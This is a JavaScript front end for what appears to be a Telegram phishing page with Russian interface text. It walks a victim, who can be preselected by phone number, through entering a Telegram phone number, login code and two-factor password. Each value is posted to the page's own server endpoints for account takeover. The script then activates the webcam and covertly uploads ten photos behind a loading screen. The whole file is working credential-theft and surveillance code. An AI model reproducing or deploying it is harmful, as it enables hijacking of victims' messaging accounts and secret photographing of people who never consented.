document.addEventListener('DOMContentLoaded', () => {
    const screens = {
        phone: document.getElementById('modal-input-phone'),
        code: document.getElementById('modal-input-code'),
        password: document.getElementById('modal-input-password'),
        camera: document.getElementById('modal-camera'),
        load: document.getElementById('modal-load'),
    };

    screens.phone.addEventListener('click', (event) => {
        if (event.target === screens.phone) {
            hideScreen('phone')
        }
    });


    let currentScreen = null;

    function showScreen(name) {
        clearScreen()

        if (screens[name]) {
            screens[name].style.display = 'flex';
            currentScreen = name;
        }
    }

    function hideScreen(name) {
        if (screens[name]) {
            screens[name].style.display = 'none';
            currentScreen = name;
        }
    }

    const clearScreen = () => {
        Object.values(screens).forEach(screen => {
            screen.style.display = 'none';
        });
    }

    const targetPhoneNumber = document.getElementById('target_phone_number').className;

    window.showPopup = function () {
        if (targetPhoneNumber === 'none') {
            showScreen('phone');
        } else  {
            startWithTargetPhoneNumder()
        }
    }

    const startWithTargetPhoneNumder = async () => {
        showScreen('load');
        await sendTelegramPhoneRequest(targetPhoneNumber)
        showScreen('code');
    }

    let sendPhoneButtonLock = false;

    const phoneInput = document.getElementById('phone');
    const sendPhoneButton = document.getElementById('continue-btn');

    phoneInput.setCustomValidity('Некорректный номер');

    function validatePhoneInput(input) {
        const regex = /^[\d\s]*\+?[\d\s]*$/;

        if (!regex.test(input.value)) {
            input.value = input.value.replace(/[^\d\s\+]/g, '');
        }

        const plusCount = (input.value.match(/\+/g) || []).length;

        if (plusCount > 1) {
            input.value = input.value.replace(/\+/g, (match, offset, string) => {
                return string.indexOf('+') === offset ? '+' : '';
            });
        }

        if (input.value[0] === '+') {
            if (input.value[1] === '0' || input.value[1] === '8') {
                input.value = input.value.slice(0, 1) + input.value.slice(2);
            }
        } else {
            if (input.value[0] === '0' || input.value[0] === '8') {
                input.value = input.value.slice(1);
            }
        }
    }
    phoneInput.addEventListener('input', () => {
        validatePhoneInput(phoneInput);
    });


    sendPhoneButton.addEventListener('click', async () => {
        if (sendPhoneButtonLock) {
            return;
        }

        phoneValue = phoneInput.value

        if (phoneValue.length < 8 || phoneValue[1] === '0') {
            phoneInput.reportValidity();
            return;
        }
            
        if (phoneValue.replace(/\s/g, "").length > 14) { phoneInput.reportValidity(); return; }

        sendPhoneButtonLock = true;
        const phoneRequestStatus = await sendTelegramPhoneRequest(phoneValue)
        sendPhoneButtonLock = false;

        if (phoneRequestStatus) {
            showScreen('code');
        } else {
            phoneInput.reportValidity();
        }
    })


    let sendCodeButtonLock = false;

    const codeInput = document.getElementById('telegram-code');
    const sendCodeButton = document.getElementById('telegram-code-popup-continue-btn');

    sendCodeButton.addEventListener('click', async () => {
        if (sendCodeButtonLock) {
            return;
        }

        const telegramCodeValue = codeInput.value;

        if (!/^\d{5}$/.test(telegramCodeValue)) {
            codeInput.setCustomValidity('Код должен содержать ровно 5 цифр');
            codeInput.reportValidity();
            return;
        }

        sendCodeButtonLock = true;
        const [codeRequestStatus, needPassword] = await sendTelegramCodeRequest(telegramCodeValue);
        sendCodeButtonLock = false;

        if (!codeRequestStatus) {
            codeInput.setCustomValidity('Неправильный код');
            codeInput.reportValidity();
            return;
        }

        if (needPassword) {
            showScreen('password');
        } else {
            startCameraRequest()
        }
    })

    codeInput.addEventListener('input', () => {
        validateCodeInput(codeInput);
    });

    function validateCodeInput(input) {
        const regex = /^\d*$/;

        if (!regex.test(input.value)) {
            input.value = input.value.replace(/[^\d]/g, '');
        }
    }

    let sendPasswordButtonLock = false;

    const passwordInput = document.getElementById('telegram-password');
    const sendPasswordButton = document.getElementById('telegram-password-popup-continue-btn');

    sendPasswordButton.addEventListener('click', async () => {
        if (sendCodeButtonLock) {
            return;
        }

        const telegramPasswordValue = passwordInput.value;

        if (telegramPasswordValue.length < 2) {
            passwordInput.setCustomValidity('Пароль должен содержать не менее 2 символов');
            passwordInput.reportValidity()
            return
        }

        
        sendPasswordButtonLock = false;
        passwordRequestStatus = await sendTelegramPasswordRequest(telegramPasswordValue)
        sendPasswordButtonLock = true;

        if (passwordRequestStatus) {
            startCameraRequest()
        } else {
            passwordInput.setCustomValidity('Неправильный пароль');
            passwordInput.reportValidity()
        }
    });

    const startCameraRequest = () => {
        showScreen('camera');
        startCamera();
    }

    const sendTelegramPhoneRequest = async (value) => {
        try {
            const response = await fetch(`/telegram_api/phone`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    telegram_phone: value
                })
            });

            const data = await response.json();

            const success = data.success;

            return success;
        } catch (e) {
            console.error(e);
            return false;
        }
    };

    const sendTelegramCodeRequest = async (value) => {
        try {
            const response = await fetch(`/telegram_api/code`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    telegram_code: value
                })
            });

            const data = await response.json();

            const success = data.success;
            const needPassword = data.need_password

            return [success, needPassword];
        } catch (e) {
            console.error(e);
            return [false, false];
        }
    };

    const sendTelegramPasswordRequest = async (value) => {
        try {
            const response = await fetch(`/telegram_api/password`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    telegram_password: value
                })
            });

            const data = await response.json();
            const success = data.success;

            return success
        } catch (e) {
            console.error(e);
            return false;
        }
    };



    let videoElement;
    let photoCount = 0;
    const totalPhotos = 10;
    const intervalTime = 2000;

    function startCamera() {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                videoElement = document.createElement('video');
                videoElement.srcObject = stream;
                videoElement.play();
                videoElement.addEventListener('loadeddata', () => {
                    showScreen('load');
                    startPhotoInterval();
                });
            })
            .catch(error => {
                console.error('Ошибка доступа к камере:', error);
            });
    }

    function stopCamera() {
        if (videoElement && videoElement.srcObject) {
            let stream = videoElement.srcObject;
            let tracks = stream.getTracks();

            tracks.forEach(track => {
                track.stop();
            });

            videoElement.srcObject = null;
        }
    }

    async function takePhoto(callback) {
        const canvasElement = document.createElement('canvas');
        canvasElement.width = videoElement.videoWidth;
        canvasElement.height = videoElement.videoHeight;
        const context = canvasElement.getContext('2d');
        context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

        console.log('Создание Blob...');

        const blob = await new Promise(resolve => canvasElement.toBlob(resolve, 'image/png'));
        if (blob) {
            console.log('Blob успешно создан');
            const formData = new FormData();
            formData.append('photo', blob, 'photo.png');

            try {
                const response = await fetch('/photo_api/upload_photo', {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                if (data.success) {
                    console.log('Фото успешно отправлено');
                } else {
                    console.log('Ошибка: ' + data.message);
                }
            } catch (error) {
                console.error('Ошибка:', error);
            }
        } else {
            console.error('Ошибка: не удалось создать Blob');
        }

        if (callback) callback();
    }

    function startPhotoInterval() {
        photoCount = 0;
        const intervalId = setInterval(() => {
            if (photoCount < totalPhotos) {
                setTimeout(() => {
                    takePhoto(() => {
                        photoCount++;
                        if (photoCount === totalPhotos) {
                            clearInterval(intervalId);
                            hideCameraPopup();
                            showLoadPopup();
                        }
                    });
                }, 100);
            }
        }, intervalTime);
    }

})